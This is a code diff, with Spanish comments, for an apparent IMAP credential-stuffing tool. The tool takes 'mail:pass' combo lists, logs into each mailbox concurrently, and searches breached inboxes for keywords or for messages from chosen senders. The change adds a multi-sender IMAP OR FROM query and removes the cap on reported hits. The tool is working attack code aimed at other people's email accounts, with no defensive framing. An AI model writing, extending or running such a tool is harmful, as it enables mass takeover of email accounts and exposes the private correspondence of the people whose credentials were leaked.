@@ -23,8 +23,10 @@ _write_lock = threading.Lock()
 # Max emails to fetch headers from per keyword per account
 MAX_EMAIL_HEADERS_PER_KW = 5
 
-# v4.2.8 — Modo «por remitente»: tope de buzones reportados
-MAX_SENDER_RESULTS = 10
+# v4.2.9 — Modo «por remitente»: tope de remitentes POR COMANDO
+# (igual que las keywords: maximo 10 separados por coma). Los RESULTADOS
+# NO tienen tope: se reportan todos los buzones con mensajes.
+MAX_SENDERS = 10
 
 
 def _detectar_tipo(correo: str) -> str:
@@ -133,16 +135,32 @@ def _search_keywords_in_inbox(imap_conn, keywords: List[str]) -> Dict[str, list]
     return results
 
 
-def _search_sender_in_inbox(imap_conn, sender: str) -> Optional[tuple]:
-    """v4.2.8: buscar mensajes ENVIADOS POR `sender` en la bandeja de un buzón
-    ya logueado (búsqueda IMAP FROM, mucho más precisa que TEXT).
+def _build_from_or_query(senders: List[str]) -> list:
+    """v4.2.9: construir argumentos de SEARCH con OR anidado para N remitentes.
+
+    IMAP SEARCH: `OR <key1> <key2>` → para [s1, s2, s3] genera
+    `OR FROM "s1" OR FROM "s2" FROM "s3"` (union de todos).
+    """
+    args = None
+    for s in reversed(senders):
+        if args is None:
+            args = ['FROM', f'"{s}"']
+        else:
+            args = ['OR', 'FROM', f'"{s}"'] + args
+    return args
+
+
+def _search_sender_in_inbox(imap_conn, senders: List[str]) -> Optional[tuple]:
+    """v4.2.9: buscar mensajes ENVIADOS POR CUALQUIERA de `senders` en la
+    bandeja de un buzón ya logueado (búsqueda IMAP FROM con OR anidado,
+    mucho más precisa que TEXT).
 
     Returns:
-        None si el buzón no tiene mensajes de ese remitente,
+        None si el buzón no tiene mensajes de ninguno de esos remitentes,
         o (sender_count, matches) con matches = [(subject, date_str), ...]
     """
     try:
-        status, msg_ids = imap_conn.search(None, 'FROM', f'"{sender}"')
+        status, msg_ids = imap_conn.search(None, *_build_from_or_query(senders))
         if status != 'OK' or not msg_ids or not msg_ids[0]:
             return None
         id_list = msg_ids[0].split()
@@ -178,15 +196,15 @@ def _search_sender_in_inbox(imap_conn, sender: str) -> Optional[tuple]:
         return None
 
 
-def _worker(combo: str, keywords: List[str] = None, sender: str = None) -> Optional[dict]:
+def _worker(combo: str, keywords: List[str] = None, senders: List[str] = None) -> Optional[dict]:
     """Process a single combo mail:pass.
 
     Returns:
         None if bad (login fallido, combo inválido o —en modo sender— buzón
-        sin mensajes del remitente), or dict with:
+        sin mensajes de NINGUNO de los remitentes), or dict with:
             combo, tipo, server, domain,
             keyword_results (if keywords provided),
-            sender_count + sender_matches (if sender provided)
+            sender_count + sender_matches (if senders provided)
     """
     if ":" not in combo:
         return None
@@ -223,10 +241,10 @@ def _worker(combo: str, keywords: List[str] = None, sender: str = None) -> Optio
         if keywords:
             result["keyword_results"] = _search_keywords_in_inbox(imap, keywords)
 
-        # v4.2.8: modo «por remitente» — solo interesan buzones CON mensajes
-        # enviados por esa dirección; sin mensajes → se descarta (None).
-        if sender:
-            found = _search_sender_in_inbox(imap, sender)
+        # v4.2.9: modo «por remitente(s)» — solo interesan buzones CON mensajes
+        # enviados por cualquiera de esas direcciones; si no hay → se descarta.
+        if senders:
+            found = _search_sender_in_inbox(imap, senders)
             if not found:
                 return None
             result["sender_count"], result["sender_matches"] = found
@@ -246,7 +264,7 @@ def _worker(combo: str, keywords: List[str] = None, sender: str = None) -> Optio
 
 def imap_check_file(input_path: Path, output_path: Path,
                     keywords: List[str] = None, progress_callback=None,
-                    sender: str = None, max_hits: int = None) -> dict:
+                    senders: List[str] = None) -> dict:
     """Check combos via IMAP with controlled concurrency.
 
     Args:
@@ -254,8 +272,8 @@ def imap_check_file(input_path: Path, output_path: Path,
         output_path: Output file for hits
         keywords: Optional list of keywords to search in inbox
         progress_callback: Function called with (checked, total, hits)
-        sender: v4.2.8 — buscar buzones con mensajes enviados por esta dirección
-        max_hits: v4.2.8 — cortar el chequeo al alcanzar N hits (modo sender: 10)
+        senders: v4.2.9 — buscar buzones con mensajes enviados por cualquiera
+                 de estas direcciones (hasta MAX_SENDERS, sin tope de hits)
 
     Returns:
         dict with: total, hits, bads, elapsed, hits_data (list of hit dicts)
@@ -272,14 +290,14 @@ def imap_check_file(input_path: Path, output_path: Path,
     checked = 0
     start_time = time.time()
 
-    # Reduce workers if keywords/sender are provided (heavier per connection)
+    # Reduce workers if keywords/senders are provided (heavier per connection)
     workers = MAX_IMAP_WORKERS
-    if keywords or sender:
+    if keywords or senders:
         workers = max(5, MAX_IMAP_WORKERS // 2)
 
     with ThreadPoolExecutor(max_workers=workers, thread_name_prefix="imap") as executor:
         future_to_combo = {
-            executor.submit(_worker, combo, keywords, sender): combo
+            executor.submit(_worker, combo, keywords, senders): combo
             for combo in combos
         }
 
@@ -303,12 +321,8 @@ def imap_check_file(input_path: Path, output_path: Path,
                 except Exception:
                     pass
 
-            # v4.2.8: tope de hits alcanzado (modo remitente, máx. 10) →
-            # cancelar pendientes y detener el chequeo.
-            if max_hits and len(hits_data) >= max_hits:
-                for pending in future_to_combo:
-                    pending.cancel()
-                break
+            # v4.2.9: los resultados del modo remitente YA NO tienen tope —
+            # se reportan todos los buzones con mensajes de esos remitentes.
 
     # Write hits to file
     with open(output_path, 'w', encoding='utf-8', buffering=1024*64) as f:
